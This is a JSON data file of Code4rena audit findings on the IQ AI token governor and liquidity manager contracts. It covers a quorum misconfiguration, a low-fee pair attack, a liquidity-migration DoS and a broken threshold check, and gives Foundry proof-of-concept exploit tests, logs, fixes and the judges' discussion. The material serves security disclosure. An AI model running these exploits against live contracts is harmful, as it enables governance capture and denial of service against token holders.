{
  "project_id": "code4rena_iq-ai_2025_03",
  "vulnerabilities": [
    {
      "finding_id": "2025-01-iq-ai_H-01",
      "severity": "high",
      "title": "Adversary can win proposals with voting power as low as 4%",
      "description": "Submitted by\njuancito\n, also found by\nAtharv\n,\nBanditx0x\n,\nden-sosnowsky\n,\ndobrevaleri\n,\nDoD4uFN\n,\nFalseGenius\n,\nGreed\n,\nhakunamatata\n,\nkomronkh\n,\nKupiaSec\n,\nLonelyWolfDemon\n,\npotatoad-sec\n,\nSamueltroydomi\n,\nshui\n,\nth3_hybrid\n,\nTopmark\n,\nwellbyt3\n,\nwillycode20\n,\nXcrypt\n, and\nzaevlad\n\nhttps://github.com/code-423n4/2025-01-iq-ai/blob/main/src/TokenGovernor.sol#L55\n\nThe expected quorum for proposals is 25% of the voting power.\n\nAn attacker can execute any proposal with as low as 4% of the voting power.\n\nProposals that don\u2019t get enough quorum are expected to fail because of that threshold, but the bug bypasses that protection by a 6.25x lower margin. Deeming High severity as a form of executing malicious proposals against expectations.\n\nThe error is in the\n4\nin the line\nGovernorVotesQuorumFraction(4)\n. It doesn\u2019t represent 1/4th of supply but 4/100 actually.\n\nconstructor\n(\nstring\nmemory\n_name\n,\nIVotes\n_token\n,\nAgent\n_agent\n)\nGovernor\n(\n_name\n)\nGovernorVotes\n(\n_token\n)\n@>\nGovernorVotesQuorumFraction\n(\n4\n)\n// quorum is 25% (1/4th) of supply\n{\nagent\n=\n_agent\n;\n}\n\nRef:\nhttps://github.com/code-423n4/2025-01-iq-ai/blob/main/src/TokenGovernor.sol#L55\n\nThis can be seen in the\nGovernorVotesQuorumFraction\nOpenZeppelin contract that is inherited.\n\nNote how the\nquorumDenominator()\nis\n100\nby default and how the\nquorum()\nis calculated as\nsupply * numerator / denominator\n.\n\nIn other words, 4% for the protocol governor (instead of 25%).\n\n/**\n*\n@dev\nReturns the quorum denominator. Defaults to 100, but may be overridden.\n*/\nfunction\nquorumDenominator\n()\npublic\nview\nvirtual\nreturns\n(\nuint256\n) {\nreturn\n100\n;\n}\n/**\n*\n@dev\nReturns the quorum for a timepoint, in terms of number of votes:\n`supply * numerator / denominator`\n.\n*/\nfunction\nquorum\n(\nuint256\ntimepoint\n)\npublic\nview\nvirtual\noverride\nreturns\n(\nuint256\n) {\nreturn\n(\ntoken\n().\ngetPastTotalSupply\n(\ntimepoint\n) *\nquorumNumerator\n(\ntimepoint\n)) /\nquorumDenominator\n();\n}\n\nRef:\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/v5.2.0/contracts/governance/extensions/GovernorVotesQuorumFraction.sol#L62-L74\n\nCoded Proof of Concept\n\nHere is a coded POC to show that those values are not overriden, and the flawed logic holds as described in the previous section.\n\nAdd the test to\ntest/TokenGovernorTest.sol\nforge test -vv --mt test_AttackLowQuorumThreshold\n\nfunction\ntest_AttackLowQuorumThreshold\n()\npublic\n{\n// Setup agent\nfactory\n.\nsetAgentStage\n(\naddress\n(\nagent\n),\n1\n);\n// Setup an attacker with 4% of voting power\n// Transfer from the whale that has 37% of tokens\nvm\n.\nstartPrank\n(\nwhale\n);\naddress\nattacker\n=\nmakeAddr\n(\n\"attacker\"\n);\nuint256\nfourPercentSupply\n=\ntoken\n.\ntotalSupply\n() *\n4\n/\n100\n;\ntoken\n.\ntransfer\n(\nattacker\n,\nfourPercentSupply\n);\n// Delegate attacker tokens to themselves\nvm\n.\nstartPrank\n(\nattacker\n);\ntoken\n.\ndelegate\n(\nattacker\n);\n// Make a malicious proposal with 4% of votes (0.01% needed)\nvm\n.\nwarp\n(\nblock\n.\ntimestamp\n+\n1\n);\naddress\n[]\nmemory\ntargets\n=\nnew\naddress\n[](\n1\n);\ntargets\n[\n0\n] =\naddress\n(\n666\n);\nuint256\n[]\nmemory\nvalues\n=\nnew\nuint256\n[](\n1\n);\nbytes\n[]\nmemory\ncalldatas\n=\nnew\nbytes\n[](\n1\n);\nstring\nmemory\ndescription\n=\n\"\"\n;\nuint256\nnonce\n=\ngovernor\n.\npropose\n(\ntargets\n,\nvalues\n,\ncalldatas\n,\ndescription\n);\n// Cast vote with 4% voting power\nvm\n.\nwarp\n(\nblock\n.\ntimestamp\n+\ngovernor\n.\nvotingDelay\n() +\n1\n);\ngovernor\n.\ncastVote\n(\nnonce\n,\n1\n);\n// Warp to the end of the voting period\n// It can be assessed that with a total votes of 100 Million, the quorum is only 4 Million\n// The voting power of the attacker can be as low as 4 Million (4%)\nvm\n.\nwarp\n(\nblock\n.\ntimestamp\n+\ngovernor\n.\nvotingPeriod\n());\nconsole\n.\nlog\n();\nconsole\n.\nlog\n(\n\"totalVotes:       \"\n,\ntoken\n.\ngetPastTotalSupply\n(\nblock\n.\ntimestamp\n-\n1\n));\nconsole\n.\nlog\n(\n\"quorum:           \"\n,\ngovernor\n.\nquorum\n(\nblock\n.\ntimestamp\n-\n1\n));\nconsole\n.\nlog\n(\n\"votingPower:      \"\n,\ngovernor\n.\ngetVotes\n(\nattacker\n,\nblock\n.\ntimestamp\n-\n1\n));\n// The proposal succeeds with only 4% of voting power (lower than the expected 25% quorum)\ngovernor\n.\nexecute\n(\ntargets\n,\nvalues\n,\ncalldatas\n,\nkeccak256\n(\nabi\n.\nencodePacked\n(\ndescription\n)));\nconsole\n.\nlog\n(\n\"ATTACK SUCCEEDED WITH ONLY 4% OF VOTES\"\n);\nvm\n.\nstopPrank\n();\n}\n\nThe test shows how an adversary with only 4% of the voting power can successfully execute a malicious proposal.\n\nLogs:\ntotalVotes:        100000000000000000000000000\nquorum:            4000000000000000000000000\nvotingPower:       4000000000000000000000000\nATTACK SUCCEEDED WITH ONLY 4% OF VOTES\n\nSet the 25% quorum correctly:\n\nconstructor(\nstring memory _name,\nIVotes _token,\nAgent _agent\n)\nGovernor(_name)\nGovernorVotes(_token)\n-       GovernorVotesQuorumFraction(4) // quorum is 25% (1/4th) of supply\n+       GovernorVotesQuorumFraction(25) // quorum is 25% (1/4th) of supply\n{\nagent = _agent;\n}\n\ntom2o17 (IQ AI) disputed and commented\n:\n\nSo I think there are two outcomes:\nThe comment is stale in which case this is informational\nThe comment takes precedent over the code, not sure why this would be the case, and I would agree w/ the initial evaluation.\nwrt \u201cthere are no documentation indicating this is a documentation error\u201d, I would argue the code itself suggests its a documentation error.\nI would also be curious as to where is there documentation indicating this is a code error, outside of the stale comment.\nPersonally would lean towards downgrading, but that is because I view all documentation as subservient to the contract functionality not the other way around. Otherwise all documentation errors would be highs.\n\n0xnev (judge) commented\n:\n\nOn secondary reviews and discussions, I believe this issue to be of a genuine documentation error and is of informational severity because 4% is likely appropriate based on various blue-chip defi protocol examples:\nUniswap - 4%\n, see\nquorumVotes\nCompound-4%, see\nquorumVotes\nAs such, I am downgrading to QA, defaulting to invalid per judging risk assessments.\n\nKupiaSec (warden) commented\n:\n\nI agree with 0xnev\u2019s earlier comments that insist 4% is too low.\nAdditionally, if there is no exact documentation regarding this quorum, the comment should be considered the source of truth. I have seen many instances where issues that show inconsistency between code implementation and comments are considered high/medium severity.\nI believe this can be considered H/M.\n\n0xnev (judge) commented\n:\n\nCould you please provide concrete evidence that 4% quorums are not sufficient? I have provided explicit blue-chip DeFi examples above, if you have an example of a governance attack because of such a quorum being low, I will reconsider the issue.\nIf not, I am inclined to maintain as informational, because afaik, C4 has never graded an issue more than QA for differing specs unless the outcome is significant.\n\nMcToady (warden) commented\n:\n\nI think comparing suitable governance quorum percentages for Agent tokens launched through this protocol to blue chip defi tokens is not ideal comparison as we have to consider the following:\nDifferences in overall market cap of the tokens\nAcquiring 4% of Uni/Compound tokens would require a significant amount of capital.\nTokens here will be launched on Fraxtal, a chain with\nsignificantly less TVL\nso it\u2019s safe to assume the market cap of agents will likely be many multiples smaller than any defi blue chip token.\nLikely initial token distributions\nAn early buyer during bootstrap phase could quite easily own 4% of the total supply and potentially purchase across multiple wallets to to conceal this from other investors.\nI think a more apt comparison would be to look at the token distributions of similar AI agent tokens (such as those launched on the\nVirtuals platform\n, where you will find typically multiple holders who each own at least 4% of the total supply.\nWhile the 4 vs 25% may have been a documentation error (and 25% may actually be too high), 4% does indeed seem too low.\n\n0xnev (judge) commented\n:\n\nThank you, I believe this is a fair argument. Based on likely volatility of AI token prices, I believe it is a significant risk to fix the quorum at 4%, especially for low price tokens, and considering all tokens are fixed to 100 million supply as well.\nBased on clarifications in\nS-188\n, I believe the main risk now would be the ownership and mismanagement (The TokenGovernor voting values impact this only) over the Agent contract itself holding the LP tokens. If price of tokens increase significantly this could have a significant impact.\nStill considering between H/M, and happy to take any further comments supporting both severities.\n\n0xnev (judge) commented\n:\n\nWill maintain as High severity, considering the risk of price significantly increasing for tokens and the potential ownership and mismanagement (The TokenGovernor voting values impact this only) over the Agent contract itself holding the LP tokens."
    },
    {
      "finding_id": "2025-01-iq-ai_M-01",
      "severity": "medium",
      "title": "Anyone can deploy a newFraxSwapPairwith a Low fee incurring losses to the protocol",
      "description": "Submitted by\nCodexBugmenot\n, also found by\n056Security\n,\n0xvd\n,\nA0z9\n,\nDoD4uFN\n,\nEPSec\n,\neternal1328\n,\nGreed\n,\nnewspacexyz\n,\npotatoad-sec\n,\nvladi319\n, and\nZkillua\n\nhttps://github.com/code-423n4/2025-01-iq-ai/blob/b16b866d4c8d3e4a69b37a02c4e396d4b294537e/src/LiquidityManager.sol#L137\n\nWhen\nLiquidityManager::moveLiquidity\nfunction is called then either a new\nFraxSwapPair\nis created with a fee of\n1%\nor if a pair already exists then the liquidity is transferred to that\nFraxSwapPair\nbut the issue is that any user can deploy this\nFraxSwapPair\nwith fee as low as\n0.01%\nwhich can only be changed back by the owner of the\nFraxSwapFactory\nand if left unchecked will result in loss of fee for the protocol.\n\nMalicious user creates a\nFraxSwapPair\nwith fee as low as\n0.01%\nbefore\nmoveLiquidity\nis called\nNow every swap before the\nfee\nis changed back to\n1%\nwill result in loss of fee for the protocol\n\nPaste the following POC in\nMoveLiquidityTest.sol\n:\n\nChange the Fee in\nFraxSwapPair\ndeployment from\n1\nto\n100\nto change\nfee\nfrom\n0.01%\nto\n1%\n:\n\nfunction\ntest_low_fee\n()\npublic\n{\nsetUpFraxtal\n(\n12_918_968\n);\naddress\nwhale\n=\n0x00160baF84b3D2014837cc12e838ea399f8b8478\n;\nuint256\ntargetCCYLiquidity\n=\n6_100_000e18\n;\nfactory\n=\nnew\nAgentFactory\n(\ncurrencyToken\n,\n0\n);\nfactory\n.\nsetAgentBytecode\n(\ntype\n(\nAgent\n).\ncreationCode\n);\nfactory\n.\nsetGovenerBytecode\n(\ntype\n(\nTokenGovernor\n).\ncreationCode\n);\nfactory\n.\nsetLiquidityManagerBytecode\n(\ntype\n(\nLiquidityManager\n).\ncreationCode\n);\n//factory.setTargetCCYLiquidity(1000e18);\nfactory\n.\nsetInitialPrice\n(\n0.1e18\n);\nvm\n.\nstartPrank\n(\nwhale\n);\ncurrencyToken\n.\napprove\n(\naddress\n(\nfactory\n),\n1e18\n);\nagent\n=\nfactory\n.\ncreateAgent\n(\n\"AIAgent\"\n,\n\"AIA\"\n,\n\"https://example.com\"\n,\n0\n);\ntoken\n=\nagent\n.\ntoken\n();\n// Buy from the bootstrap pool\nmanager\n=\nLiquidityManager\n(\nfactory\n.\nagentManager\n(\naddress\n(\nagent\n)));\nbootstrapPool\n=\nmanager\n.\nbootstrapPool\n();\ncurrencyToken\n.\napprove\n(\naddress\n(\nbootstrapPool\n),\n10_000_000e18\n);\nbootstrapPool\n.\nbuy\n(\n6_000_000e18\n);\nvm\n.\nstopPrank\n();\n// the above code is setup()\n// griefer buys from `BootstrapPool` to get minimum liquidity required to create a pool\naddress\n_griefer\n=\nmakeAddr\n(\n\"griefer\"\n);\ndeal\n(\naddress\n(\ncurrencyToken\n),\n_griefer\n,\n1000\nether\n);\nvm\n.\ndeal\n(\n_griefer\n,\n10\nether\n);\nvm\n.\nstartPrank\n(\n_griefer\n);\ncurrencyToken\n.\napprove\n(\naddress\n(\nbootstrapPool\n),\n10\nether\n);\nuint256\ntknamt\n=\nbootstrapPool\n.\nbuy\n(\n5\nether\n);\n//griefer creates `FraxSwapPair`\nIFraxswapPair\nfraxswapPair\n=\nIFraxswapPair\n(\nmanager\n.\nfraxswapFactory\n().\ncreatePair\n(\naddress\n(\ncurrencyToken\n),\naddress\n(\ntoken\n),\n1\n));\n// Fee set here\ncurrencyToken\n.\ntransfer\n(\naddress\n(\nfraxswapPair\n),\n5\nether\n);\ntoken\n.\ntransfer\n(\naddress\n(\nfraxswapPair\n),\ntknamt\n);\nfraxswapPair\n.\nmint\n(\naddress\n(\n_griefer\n));\n// Move liquidity\nmanager\n.\nmoveLiquidity\n();\n// Swap from the Fraxswap pool\n//token(0) is AI token\n//token(1) is currency token\n// griefer swaps 1 ether worth of his currency token for AI token\nfraxswapPair\n=\nIFraxswapPair\n(\nmanager\n.\nfraxswapFactory\n().\ngetPair\n(\naddress\n(\ncurrencyToken\n),\naddress\n(\ntoken\n)));\nuint256\namountOut\n=\nfraxswapPair\n.\ngetAmountOut\n(\n1e18\n,\naddress\n(\ncurrencyToken\n));\ncurrencyToken\n.\ntransfer\n(\naddress\n(\nfraxswapPair\n),\n1e18\n);\nif\n(\nfraxswapPair\n.\ntoken0\n() ==\naddress\n(\ncurrencyToken\n)) {\nfraxswapPair\n.\nswap\n(\n0\n,\namountOut\n,\naddress\n(\n_griefer\n),\n\"\"\n);\n}\nelse\n{\nfraxswapPair\n.\nswap\n(\namountOut\n,\n0\n,\naddress\n(\n_griefer\n),\n\"\"\n);\n}\nvm\n.\nstopPrank\n();\n}\n\nFrom the Above test :\n\nwhen fee is\n0.01%\nCurrency token\namountIn ---->\n1e18\nwe get\nAi token\namountOut ---->\n3.935e18\nwhen fee is\n1%\nCurrency token\namountIn ---->\n1e18\nwe get\nAi token\namountOut ---->\n3.896e18\nso for a swap of\n1 ether\nworth of\ncurrency token\nthe protocol loses\n0.039 ether\nworth of\nAI tokens\nin fee\n\nNow for much higher transactions, including the\n3 swaps\ndone during the\nmoveLiquidity\n, all that fee is lost to the protocol.\n\nThis issue exists for every new\nAgent\ncreated in\nAgentFactory\nand it is not feasible for the\nowner\nto check\nfee\namount on every pair so, consider creating a new\nFraxSwapPair\nwith the desired fee in\nAgentFactory::createAgent\nitself to avoid these fee discrepancies.\n\nConsider any design change which will prevent arbitrary users to set\nfee\n.\n\nDenett (IQ AI) commented\n:\n\nThe protocol does not earn the fees from Fraxswap swaps. These are shared between the LP (the agent) and Fraxswap. The Fraxswap owner can unilaterally update the fee to the desired value.\n\n0xnev (judge) commented\n:\n\nI believe this is a valid concern. The TokenGovernor is the intended owner of the Agent contract which will hold the LP funds. From the context of the codebase, the\ntradingFee\nshould be respected in the\nAgentFactory\ncontract set by the admin, so that the fees received by the TokenGovernor is accurate (up to 1%).\nIf set lower than expected by an external user \u2014> Agent earns less fees\nIf set higher than expected by an external user \u2014> Slightly affects pricing in subsequent fraxpool when computing output amounts when fee is accounted for\nWhile it is true that the Frax\nprivileged fee-to-setter multisig\ncan adjust the fees for specific pairs, since it can result in accumulated fee loss based on duration before this fees is reset, I believe Medium severity is appropriate."
    },
    {
      "finding_id": "2025-01-iq-ai_M-02",
      "severity": "medium",
      "title": "Attacker can DOS liquidity migration in LiquidityManager.sol",
      "description": "Submitted by\n0xAsen\n, also found by\nattentioniayn\n,\nDanielArmstrong\n,\njkk812812\n,\nkutugu\n,\nRampage\n,\nt0x1c\n,\ntallo\n,\nWalodja1987\n, and\nzraxx\n\nhttps://github.com/code-423n4/2025-01-iq-ai/blob/main/src/LiquidityManager.sol#L116-L117\n\nhttps://github.com/code-423n4/2025-01-iq-ai/blob/main/src/LiquidityManager.sol#L141\n\nThe LiquidityManager\u2019s liquidity migration function,\nmoveLiquidity()\nis susceptible to a DOS attack that any malicious attacker can perform.\n\nThe reason for this is that\nmoveLiquidity()\nrelies on the raw ERC20 balance of the currency token held by the contract to determine the amount of agent token liquidity to add. In particular, the function calculates the currency token balance via:\n\nuint256\ncurrencyAmount\n=\ncurrencyToken\n.\nbalanceOf\n(\naddress\n(\nthis\n));\nuint256\nliquidityAmount\n= (\ncurrencyAmount\n*\n1e18\n) /\nprice\n;\n\nThis design assumes that the only currency tokens held by the LiquidityManager are those coming from the controlled bootstrap pool. However, an attacker can directly transfer extra currency tokens (e.g., IQ tokens) into the LiquidityManager.\n\nThis \u201cinjection\u201d increases the raw balance reported by\nbalanceOf(address(this))\n, causing the computed\nliquidityAmount\n\u2014 which represents the amount of agent tokens required for migration to be artificially inflated.\n\nWhen the LiquidityManager then attempts to transfer agent tokens to add liquidity (via a subsequent call to\naddLiquidityToFraxswap()\n), the computed amount exceeds the actual agent token balance held by the contract. This results in a failure (an\nERC20InsufficientBalance\nrevert) during the migration process, effectively causing a denial-of-service (DoS) that blocks liquidity migration and disrupts normal protocol operations.\n\nImpact:\n\nProtocol Disruption: The migration process is a core functionality for moving liquidity from the bootstrap pool to the Fraxswap pair.\nUser Harm: Disrupted liquidity migration can result in poor market pricing or loss of confidence, potentially causing users to incur losses when trading or exiting positions.\nDenial-of-Service (DoS): An attacker can exploit this vulnerability to prevent liquidity migration, indirectly impacting the protocol\u2019s ability to function as intended.\n\nImpact: High\n\nLikelihood: Medium as it requires an attacker to spend funds. How well-funded he must be depends on the exact amount of tokens that will be used in a real environment and how willing he is to cause damage to the protocol and its users (a competitor or someone else with malicious intent).\n\nLet\u2019s look at the relevant parts of the source code. A coded POC is supplied after.\nLiquidityManager.sol,\nmoveLiquidity()\n:\n\n// Determine liquidity amount to add\nuint256\ncurrencyAmount\n=\ncurrencyToken\n.\nbalanceOf\n(\naddress\n(\nthis\n));\nuint256\nliquidityAmount\n= (\ncurrencyAmount\n*\n1e18\n) /\nprice\n;\n// Add liquidity to Fraxswap\nIFraxswapPair\nfraxswapPair\n=\naddLiquidityToFraxswap\n(\nliquidityAmount\n,\ncurrencyAmount\n);\n\nWe can see that the function relies on the raw currency tokens balance of the contract and uses that to calculate\nliquidityAmount\n- the amount of agent tokens to add as liquidity to Fraxswap.\n\naddLiquidityToFraxswap()\n:\n\nfunction\naddLiquidityToFraxswap\n(\nuint256\nliquidityAmount\n,\nuint256\ncurrencyAmount\n)\ninternal\nreturns\n(\nIFraxswapPair\nfraxswapPair\n) {\nfraxswapPair\n=\nIFraxswapPair\n(\nfraxswapFactory\n.\ngetPair\n(\naddress\n(\ncurrencyToken\n),\naddress\n(\nagentToken\n)));\nif\n(\nfraxswapPair\n==\nIFraxswapPair\n(\naddress\n(\n0\n))) {\n// Create Fraxswap pair and add liquidity\nfraxswapPair\n=\nIFraxswapPair\n(\nfraxswapFactory\n.\ncreatePair\n(\naddress\n(\ncurrencyToken\n),\naddress\n(\nagentToken\n),\nfee\n));\nagentToken\n.\nsafeTransfer\n(\naddress\n(\nfraxswapPair\n),\nliquidityAmount\n); <--\ncurrencyToken\n.\nsafeTransfer\n(\naddress\n(\nfraxswapPair\n),\ncurrencyAmount\n);\nfraxswapPair\n.\nmint\n(\naddress\n(\nthis\n));\n\nNow, if the\nliquidityAmount\nhas been inflated by performing the attack, this line will fail if the contract doesn\u2019t have enough balance:\n\nagentToken\n.\nsafeTransfer\n(\naddress\n(\nfraxswapPair\n),\nliquidityAmount\n);\n\nTo demonstrate this vulnerability, here\u2019s a coded POC that you can add to\nMoveLiquidityTest.sol\n.\nRun it via\nforge test --match-test test_MoveLiquidity_TokenInjection -vvv\n.\n\nfunction\ntest_MoveLiquidity_TokenInjection\n()\npublic\n{\n// Set up the fork and environment.\nsetUpFraxtal\n(\n12_918_968\n);\n// agent deployer\naddress\ndev\n=\naddress\n(\n0x1234\n);\n// attacker\naddress\nattacker\n=\n0x00160baF84b3D2014837cc12e838ea399f8b8478\n;\n// deal to dev a lot of currency tokens to operate\ndeal\n(\naddress\n(\ncurrencyToken\n),\ndev\n,\n30_000_000e18\n);\n// Set target liquidity parameters in the factory.\nuint256\ntargetCCYLiquidity\n=\n6_100_000e18\n;\n// Deploy a new AgentFactory. (Assume currencyToken is already set up.)\nfactory\n=\nnew\nAgentFactory\n(\ncurrencyToken\n,\n0\n);\nfactory\n.\nsetAgentBytecode\n(\ntype\n(\nAgent\n).\ncreationCode\n);\nfactory\n.\nsetGovenerBytecode\n(\ntype\n(\nTokenGovernor\n).\ncreationCode\n);\nfactory\n.\nsetLiquidityManagerBytecode\n(\ntype\n(\nLiquidityManager\n).\ncreationCode\n);\n// For testing migration quickly, set a low target liquidity.\nfactory\n.\nsetTargetCCYLiquidity\n(\n1000\n);\n// Set an initial price, e.g. 0.1 IQ per agent token.\nfactory\n.\nsetInitialPrice\n(\n0.1e18\n);\n// --- Deploy agent and all relevant contract ---\n// Simulate normal user activity to push the pool toward the target.\nvm\n.\nstartPrank\n(\ndev\n);\n// Approve and create the agent\ncurrencyToken\n.\napprove\n(\naddress\n(\nfactory\n),\ntype\n(\nuint256\n).\nmax\n);\n// dev directly buys enough so that the target liquidity is satisfied\nagent\n=\nfactory\n.\ncreateAgent\n(\n\"ExploitAgent\"\n,\n\"EXP\"\n,\n\"https://exploit.com\"\n,\ntargetCCYLiquidity\n);\ntoken\n=\nagent\n.\ntoken\n();\n// Retrieve the LiquidityManager and the BootstrapPool.\nmanager\n=\nLiquidityManager\n(\nfactory\n.\nagentManager\n(\naddress\n(\nagent\n)));\nbootstrapPool\n=\nmanager\n.\nbootstrapPool\n();\n// ensure bootstrap pool is initialized\nrequire\n(\naddress\n(\nbootstrapPool\n) !=\naddress\n(\n0\n),\n\"BootstrapPool not initialized\"\n);\nvm\n.\nstopPrank\n();\n// --- Attacker Manipulates the LiquidityManager by Injecting Currency Tokens ---\n// Here the attacker directly transfers extra currency tokens into the LiquidityManager.\n// deal currency tokens to the attacker\ndeal\n(\naddress\n(\ncurrencyToken\n),\nattacker\n,\n10_000_000e18\n);\n// Impersonate the attacker.\nvm\n.\nstartPrank\n(\nattacker\n);\nuint256\nextraIQTokens\n=\ncurrencyToken\n.\nbalanceOf\n(\nattacker\n);\n// Amount chosen for demonstration.\n// transfer the currency tokens to the manager contract\ncurrencyToken\n.\ntransfer\n(\naddress\n(\nmanager\n),\nextraIQTokens\n);\n// --- Migrate Liquidity ---\n// The LiquidityManager will now check that the effective IQ reserve (after subtracting phantom)\n// meets the target, and then call moveLiquidity() to migrate liquidity from the BootstrapPool.\nmanager\n.\nmoveLiquidity\n();\n// After migration, retrieve the Fraxswap pair created by the LiquidityManager.\nIFraxswapPair\nfraxswapPair\n=\nIFraxswapPair\n(\nmanager\n.\nfraxswapFactory\n().\ngetPair\n(\naddress\n(\ncurrencyToken\n),\naddress\n(\ntoken\n))\n);\n(\nuint112\nfraxIQ\n,\nuint112\nfraxAgent\n, ) =\nfraxswapPair\n.\ngetReserves\n();\nconsole2\n.\nlog\n(\n\"Fraxswap Pool IQ Reserve:\"\n,\nfraxIQ\n);\nconsole2\n.\nlog\n(\n\"Fraxswap Pool Agent Token Reserve:\"\n,\nfraxAgent\n);\n// Compute the final price in Fraxswap.\nuint256\nfinalPrice\n= (\nuint256\n(\nfraxIQ\n) *\n1e18\n) /\nuint256\n(\nfraxAgent\n);\nconsole2\n.\nlog\n(\n\"Final Price in Fraxswap (IQ per agent token):\"\n,\nfinalPrice\n);\nvm\n.\nstopPrank\n();\n}\n\nWith that implementation, the test\nfails\nbecause the manager contract doesn\u2019t have enough agent token balance:\n\n[FAIL. Reason: ERC20InsufficientBalance(0x20518cf72FF021e972F704d5B56Ab73FC163713d, 62348026684955421160920257 [6.234e25], 62348026684955421403284271 [6.234e25])] test_MoveLiquidity_TokenInjection() (gas: 48955838)\n\nTo verify that this test works otherwise, change this line:\ndeal(address(currencyToken), attacker, 10_000_000e18);\n\nto\n\ndeal(address(currencyToken), attacker, 9_000_000e18);\n\nby decreasing the amount of currency tokens the attacker adds, the test and the migration will be successful.\n\nSummary:\n\nIn our testing environment, when the attacker transfers 9,000,000 IQ tokens to the LiquidityManager, the migration process succeeds (albeit with an artificially manipulated price). However, when the attacker increases the injection to 10,000,000 IQ tokens, the computed liquidity amount exceeds the actual agent token balance held by the LiquidityManager. This results in an\nERC20InsufficientBalance\nerror during the liquidity migration step, effectively causing the process to revert.\n\n(Note: The detailed logs and the failing transaction trace confirm that the agent token transfer reverts because the required amount is slightly higher than available.)\n\nCalculate the liquidity amount based on the currency amount that was received by the bootstrap pool. Proposed fix:\n\nuint256\ncurrencyAmount\n=\n_reserveCurrencyToken\n;\n\nThat way the attack wouldn\u2019t work, and there\u2019s also no risk of tokens getting left in the manager contract as you transfer them to the agent either way:\n\nagentToken\n.\nsafeTransfer\n(\naddress\n(\nagent\n),\nagentToken\n.\nbalanceOf\n(\naddress\n(\nthis\n)));\ncurrencyToken\n.\nsafeTransfer\n(\naddress\n(\nagent\n),\ncurrencyToken\n.\nbalanceOf\n(\naddress\n(\nthis\n)));\n\nDenett (IQ AI) commented\n:\n\nNice find, it is pretty expensive though and can be remedied by depositing some agent tokens into the Liquidity manager.\nI would consider this an unlikely attack, so Medium level.\n\ntom2o17 (IQ AI) commented\n:\n\nAlso want to acknowledge will fix.\nHowever, given the user would be out ~ 40k + in order to DDOS I would downgrade to Medium.\n\n0xnev (judge) decreased severity to Medium and commented\n:\n\nAgree with downgrade to Medium because:\nAll donated funds are lost to the BootStrapPool, and since this is accounted for in the computation for prices, it can be retrieved back from sale of agentTokens.\nThis DoS is difficult to sustain constantly and profitably, since Fraxtal is a OP stack chain which has no private mem-pool, This could risk aimless donation of tokens if\ncurrencyAmount\nand\nliquidityAmount\nvalues changes before pool migration.\n\ntom2o17 (IQ AI) mitigated:\n\nPR 8\n\nStatus:\nMitigation confirmed."
    },
    {
      "finding_id": "2025-01-iq-ai_M-03",
      "severity": "medium",
      "title": "Ineffective proposal threshold validation allows setting arbitrary high values",
      "description": "Submitted by\nIncogknito\n, also found by\n0x23r0\n,\n0xAadi\n,\n0xaudron\n,\n0xmujahid002\n,\n0xvd\n,\nanchabadze\n,\nArjuna\n,\naster\n,\nBALADOU\n,\nbareli\n,\nBizarro\n,\nBrene\n,\ndreamcoder\n,\neLSeR17\n,\neta\n,\neternal1328\n,\nEurovickk\n,\nfelconsec\n,\ngxh191\n,\nhrmneffdii\n,\nIceBear\n,\nIshenxx\n,\nLamsy\n,\nManga\n,\nmuellerberndt\n,\nnoname_09\n,\nPetrus\n,\nphaseTwo\n,\nShinobi\n,\nsohrabhind\n,\nSparrow\n,\nTamer\n,\nTopmark\n,\nunnamed\n,\nwillycode20\n, and\nxKeywordx\n\nhttps://github.com/code-423n4/2025-01-iq-ai/blob/b16b866d4c8d3e4a69b37a02c4e396d4b294537e/src/TokenGovernor.sol#L81-L86\n\nThe\nsetProposalThresholdPercentage\nfunction in TokenGovernor checks the wrong variable when trying to enforce the maximum 10% threshold limit. Instead of validating the new incoming value, it checks the current stored value, making the protection completely ineffective.\n\nThis means anyone can propose and pass a governance proposal that sets the threshold to any value (even 100% or higher), which could effectively break the governance system by making it impossible for token holders to create new proposals.\n\nThe impact is severe because:\n\nIt could lock out all governance participation if set too high\nIt breaks the intended maximum 10% threshold protection\nIt could require another governance proposal to fix, which might be impossible if the threshold is set too high\n\nfunction\nsetProposalThresholdPercentage\n(\nuint32\n_proposalThresholdPercentage\n)\npublic\n{\nif\n(\nmsg\n.\nsender\n!=\naddress\n(\nthis\n))\nrevert\nNotGovernor\n();\nif\n(\nproposalThresholdPercentage\n>\n1000\n)\nrevert\nInvalidThreshold\n();\n// Max 10%\nproposalThresholdPercentage\n=\n_proposalThresholdPercentage\n;\nemit\nProposalThresholdSet\n(\n_proposalThresholdPercentage\n);\n}\n\nAttack scenario:\n\nAttacker creates a governance proposal to set\nproposalThresholdPercentage\nto 9000 (90%)\nThe check\nif (proposalThresholdPercentage > 1000)\nlooks at the current value (let\u2019s say 100), not 9000\nThe check passes because 100 < 1000\nThe threshold is set to 9000, requiring 90% of total supply to create proposals\nThe governance system becomes effectively frozen as gathering 90% support for new proposals is practically impossible\n\nChange the validation to check the new input value instead of the current value:\n\nfunction setProposalThresholdPercentage(uint32 _proposalThresholdPercentage) public {\nif (msg.sender != address(this)) revert NotGovernor();\n-  if (proposalThresholdPercentage > 1000) revert InvalidThreshold(); // Max 10%\n+   if (_proposalThresholdPercentage > 1000) revert InvalidThreshold(); // Max 10%\nproposalThresholdPercentage = _proposalThresholdPercentage;\nemit ProposalThresholdSet(_proposalThresholdPercentage);\n}\n\n0xnev (judge) commented\n:\n\nBorderline medium/low, the intended check is indeed incorrect, however, it would require a malicious voted proposal. Since function is affected, I would agree with Medium per C4 guidelines.\n2 \u2014 Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n\ntom2o17 (IQ AI) confirmed and commented\n:\n\nAgree With finding. Will fix.\n\n0xnev (judge) commented\n:\n\nWill confirm as Medium, because there is a risk of a whale coming in with sufficient quorum (now currently at 4%) to propose a proposal and executing it, which would thereafter possibly allow mismanaging of funds owned by the Agent and TokenGovernor contracts.\n\ntom2o17 (IQ AI) mitigated:\n\nPR 11\n\nStatus:\nMitigation confirmed.\n\nFor this audit, 18 reports were submitted by wardens detailing low risk and non-critical issues. The\nreport highlighted below\nby\npotatoad-sec\nreceived the top score from the judge.\n\nThe following wardens also submitted reports:\n0xAkira\n,\nAlekso\n,\ndobrevaleri\n,\nDoD4uFN\n,\nghost_1911_soap\n,\nGreed\n,\nHardlyDifficult\n,\ninh3l\n,\nIshenxx\n,\nK42\n,\nKKaminsk\n,\nLouisTsai\n,\nnewspacexyz\n,\nphaseTwo\n,\nphoenixV110\n,\nSparrow\n, and\nWalodja1987\n."
    },
    {
